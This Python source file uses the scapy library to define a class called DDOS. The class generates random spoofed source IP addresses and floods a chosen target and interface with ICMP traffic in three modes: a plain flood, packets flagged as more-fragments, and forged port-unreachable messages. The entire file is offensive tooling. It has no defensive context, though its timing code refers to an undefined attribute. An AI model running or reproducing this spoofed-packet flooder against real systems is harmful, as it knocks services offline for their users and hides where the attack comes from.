import sys
import time
import scapy
import random
import struct
import socket


from scapy.all import *
from random import getrandbits
from six.moves import input as raw_input


class DDOS:
	def __init__(self, target, n_ips, msg_size, interface):
		self.target = target
		self.n_ips = n_ips
		self.msg_size = msg_size
		self.interface = interface
		self.ips = []
		self.load = "flood"*162
	
	def get_random_ips(self):
		for i in range(0,int(self.n_ips)):
			try:
				self.ips.append(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))))
			except:
				self.n_ips = self.n_ips + 1
				continue

	def sendPacketFlood(self, ip):
		send((IP(dst=self.target,src=ip)/ICMP()/self.load)*int(self.msg_size), iface=self.interface, verbose=False)

	def sendPacketMF(self, ip):
		send((IP(dst=self.target, src=ip, flags="MF", proto = 17, frag = 0)/ICMP()/self.load)*int(self.msg_size), iface=self.interface, verbose=False)

	def sendPacketT3(self, ip):
		send((IP(dst=self.target,src=ip)/ICMP(type=3, code=3))*int(self.msg_size), iface=self.interface, verbose=False)

	def run(self, mode):
		try:
			t0 = time.time()

			if mode == 0:
				for i in self.ips:
					self.sendPacketFlood(i)
			elif mode == 1:
				for i in self.ips:
					self.sendPacketMF(i) 
			elif mode == 2:
				for i in self.ips:
					self.sendPacketT3(i) 
			else:
				return 0, 0

			total_s = float(time.time() - t0)
			total_p = int(self.n_ips) * int(self.n_msg)
			ratio = float(total_p)/float(total_s)
			
			return total_s, ratio
		except:
			return 0, 0
